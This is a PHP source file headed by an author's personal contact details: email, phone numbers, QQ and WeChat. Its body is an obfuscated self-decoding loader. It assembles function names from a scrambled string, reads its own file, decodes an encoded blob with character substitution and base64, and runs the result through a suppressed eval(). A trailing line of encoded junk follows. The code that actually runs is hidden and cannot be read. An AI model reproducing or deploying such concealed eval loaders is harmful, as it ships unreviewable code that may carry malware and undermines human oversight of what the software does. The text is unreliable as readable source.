<?php
/*
Author:Yangchi
Email: 17734027950@189.cn
Mobile: 17734027950
QQ: 1007684997
Wechat: 18210427950
*/
$ö›≠›•='ribud5plsf_46amctyoe';$ÖÅÃﬂ’ˇ=$ö›≠›•{9}.$ö›≠›•{1}.$ö›≠›•{7}.$ö›≠›•{19};$ﬂ’˙ÅˇÃÖ=$ö›≠›•{8}.$ö›≠›•{16}.$ö›≠›•{0}.$ö›≠›•{10}.$ö›≠›•{0}.$ö›≠›•{19}.$ö›≠›•{6}.$ö›≠›•{7}.$ö›≠›•{13}.$ö›≠›•{15}.$ö›≠›•{19};$’ÅÃﬂÖ=$ö›≠›•{13}.$ö›≠›•{0}.$ö›≠›•{0}.$ö›≠›•{13}.$ö›≠›•{17}.$ö›≠›•{10}.$ö›≠›•{6}.$ö›≠›•{18}.$ö›≠›•{6};$ˇÖ’ﬂŒ=$ö›≠›•{1}.$ö›≠›•{14}.$ö›≠›•{6}.$ö›≠›•{7}.$ö›≠›•{18}.$ö›≠›•{4}.$ö›≠›•{19};$Å’Ã=$ö›≠›•{8}.$ö›≠›•{3}.$ö›≠›•{2}.$ö›≠›•{8}.$ö›≠›•{16}.$ö›≠›•{0};$ÃÖﬂˇ=$ö›≠›•{8}.$ö›≠›•{16}.$ö›≠›•{0}.$ö›≠›•{0}.$ö›≠›•{6}.$ö›≠›•{18}.$ö›≠›•{8};$˙ÃÖ’=$ö›≠›•{14}.$ö›≠›•{4}.$ö›≠›•{5};$˙=$ö›≠›•{2}.$ö›≠›•{13}.$ö›≠›•{8}.$ö›≠›•{19}.$ö›≠›•{12}.$ö›≠›•{11}.$ö›≠›•{10}.$ö›≠›•{4}.$ö›≠›•{19}.$ö›≠›•{15}.$ö›≠›•{18}.$ö›≠›•{4}.$ö›≠›•{19};$Å˙ÃÖŒ=$ö›≠›•{8}.$ö›≠›•{16}.$ö›≠›•{0}.$ö›≠›•{16}.$ö›≠›•{0};$»ƒ=$ÖÅÃﬂ’ˇ($ﬂ’˙ÅˇÃÖ('\\','/',__FILE__));$ƒ=$’ÅÃﬂÖ($»ƒ);$»⁄êú=$’ÅÃﬂÖ($»ƒ);$»êõœ=$ˇÖ’ﬂŒ('',$»ƒ).$Å’Ã($»⁄êú,0,$ÃÖﬂˇ($»⁄êú,'@ev'));$⁄œÜƒõê»=$˙ÃÖ’($»êõœ);$»ƒ=$»⁄êú=$»êõœ=NULL;@eval($˙($ﬂ’˙ÅˇÃÖ($⁄œÜƒõê»,'',$Å˙ÃÖŒ('ov=noFvYvdãoYönBnúúõIBõ==õIdöqúõ/jPö68xCVCC/êãâ/HLN2Ñ5ì2ÜXzA†ëuD2çPwr6éçéâP5Oã6FïXçHuÖAP8êBN24z5ëHÑòDêXSõ46Còw6ÑôdÅLBéòuYEôëuE8ïNbÅf8B6†ÉICIÜJoöIéSdìÑHvWu6kòçòoIfñ/çANNzâ4uEöOrçFIqïÑòVXYxQxJFYxéõé/òH†ôqAPÖòCOVIDò6JêAYéêPâïDõfq6j=ïFë†zÑïÅIöéãEQvHzÅOEzõòÉÅAEvII2buFuòNõDçPAB4=õrPEANréCòNJwjfbÅïïBYYôDéAÅYôÉé6ôçÑçÉxEHIìdd2ï2bDNfAn/2Ñ5/SFJÑòPEÑSU+','éDnfêîWqX5CsTLzcHgQvoëUát†ÅåKóNZGú=Abâwa8ûòìù6Vy2+ô1hJrdñuÑPjÜÄÉçö47ãMmeÇkïIxi/àRBäè0Y3lESFõÖ9Oüíp','Np7SHïtbnEoñåOjôXÄy94usÜùRmÅüáKëç8fkcz3/WélLèYPöC=i†úgFe+ZTVGAQU2BÖ6âJÉqírhawûIäìdõòê5àîMD01vãxóÇÑ'))));unset($ö›≠›•,$ÖÅÃﬂ’ˇ,$ﬂ’˙ÅˇÃÖ,$’ÅÃﬂÖ,$ˇÖ’ﬂŒ,$Å’Ã,$ÃÖﬂˇ,$˙ÃÖ’,$˙,$Å˙ÃÖŒ,$»ƒ,$ƒ,$»⁄êú,$»êõœ,$⁄œÜƒõê»);return;?>
bjïxI8YÅqQJDLx++